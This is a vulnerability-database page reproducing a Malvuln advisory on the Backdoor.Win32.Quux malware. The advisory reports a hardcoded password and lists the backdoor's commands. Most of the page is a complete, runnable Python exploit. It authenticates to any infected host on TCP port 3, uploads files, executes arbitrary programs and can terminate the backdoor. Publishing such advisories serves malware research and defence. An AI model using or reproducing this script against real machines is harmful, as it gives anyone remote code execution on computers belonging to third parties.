---
title: Backdoor.Win32.Quux / Weak Hardcoded Credentials
url: https://cxsecurity.com/issue/WLB-2022110028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-18
fetch_date: 2025-10-03T23:05:02.519241
---

# Backdoor.Win32.Quux / Weak Hardcoded Credentials

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Quux / Weak Hardcoded Credentials** **2022.11.17**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/13ce53de9ca4c4e6c58f990b442cb419.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Threat: Backdoor.Win32.Quux
Vulnerability: Weak Hardcoded Credentials
Family: Quux
Type: PE32
MD5: 13ce53de9ca4c4e6c58f990b442cb419
Vuln ID: MVID-2022-0656
Dropped files: quux32.exe
Disclosure: 11/15/2022
Description: The malware listens on TCP port 3. Authentication is required, however the password "Faraon" translated from Romanian as "Pharaoh" is weak and hardcoded in cleartext within the PE file. Third-party adversaries who can reach an infected host can call commands made available by the backdoor. Commands include uploading files and code execution. Theres a need to code a custom client to communicate with the infected host as nc64.exe and telnet send LF characters and will fail authentication when sending credentials containing "\n" etc. Once connected if we send any files they will be written to Windows\System unless calling the "SetCurrDir" commmand.
0040AD24 ; char aFaraon[]
0040AD24 aFaraon db 'Faraon',0 ; DATA XREF \_WinMain@16\_0+376â†‘o
0040AD2B align 100h
[Commands]
SetCurrDir
GetCurrDir
GetCurrentDirectory
Exec
GetFile
SendFile
quit
exit
shutdown
dir
CreateFile
DeleteFile
MessageBox
die
Exploit/PoC:
"quux32\_xploit.py"
from socket import \*
import time, sys
BANNER="""
\_\_\_\_ \_\_\_\_ \_\_\_ \_\_\_\_ \_\_ \_ \_\_
/ \_\_ \\_\_ \_\_\_\_ \_\_\_\_ \_\_ |\_ /|\_ | / \_\_/\_ \_\_ \_\_\_ / /\_\_ (\_) /\_
/ /\_/ / // / // /\ \ /\_/\_ </ \_\_/ / \_/ \ \ // \_ \/ / \_ \/ / \_\_/
\\_\_\_\\_\\_,\_/\\_,\_//\_\\_\/\_\_\_\_/\_\_\_\_/ /\_\_\_//\_\\_\/ .\_\_/\_/\\_\_\_/\_/\\_\_/
/\_/
By Malvuln
MVID-2022-0656 - Nov 2022
"""
MALWARE\_HOST=""
PORT=3
CREDZ="Faraon"
def chk\_res(s):
res=""
while True:
res += s.recv(512).decode()
if "#" in res or "\0" in res or "\n" in res or ":" in res:
break
return res
def auth():
s=socket(AF\_INET, SOCK\_STREAM)
s.connect((MALWARE\_HOST, PORT))
#Authenticate
s.send(CREDZ.encode())
time.sleep(0.5)
return s
def upload(the\_file):
s = auth()
PAYLOAD="GetCurrentDirectory"
s.send(PAYLOAD.encode())
time.sleep(0.5)
print(chk\_res(s))
PAYLOAD="SetCurrDir"
s.send(PAYLOAD.encode())
time.sleep(0.5)
print(chk\_res(s))
PAYLOAD="C:\\Users\\Public"
s.send(PAYLOAD.encode())
time.sleep(0.5)
print(chk\_res(s))
PAYLOAD="GetCurrentDirectory"
s.send(PAYLOAD.encode())
time.sleep(0.5)
print(chk\_res(s))
PAYLOAD="SendFile"
s.send(PAYLOAD.encode())
time.sleep(0.5)
PAYLOAD=the\_file
s.send(PAYLOAD.encode())
time.sleep(0.5)
PAYLOAD="Exec"
s.send(PAYLOAD.encode())
time.sleep(0.5)
PAYLOAD=the\_file
s.send(PAYLOAD.encode())
time.sleep(0.5)
print(chk\_res(s))
print("[+] Uploading: "+the\_file)
time.sleep(2)
s.close()
def isIP(ip):
try:
inet\_aton(ip)
return True
except Exception as e:
return False
def execute(program):
s = auth()
PAYLOAD="Exec"
s.send(PAYLOAD.encode())
time.sleep(0.5)
PAYLOAD=program
s.send(PAYLOAD.encode())
time.sleep(0.5)
print(chk\_res(s))
print("[+] Executing: "+program)
def kill\_srv():
s = auth()
print(chk\_res(s))
PAYLOAD="die"
s.send(PAYLOAD.encode())
time.sleep(0.5)
print("[+] Backdoor terminated!")
if \_\_name\_\_=="\_\_main\_\_":
print(BANNER)
if len(sys.argv) == 3:
MALWARE\_HOST=sys.argv[1]
CMD = sys.argv[2]
if isIP(MALWARE\_HOST):
if CMD=="1":
\_file=input("[-] File to upload: > ")
if \_file:
upload(\_file)
else:
exit(1)
elif CMD=="2":
pgm=input("[-] Program to run: > ")
if pgm:
execute(pgm)
else:
exit(1)
elif CMD=="3":
choice=input("[-] Kill server? 1=Yes > ")
if choice.lower()=="1":
kill\_srv()
else:
print("[!] Invalid IP!")
exit(1)
else:
print("[\*] QuuX32 Exploit Usage: \n[-]IP: x.x.x.x, Command (1=Upload file, 2=Exec program, 3=Kill server)")
exit(1)
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top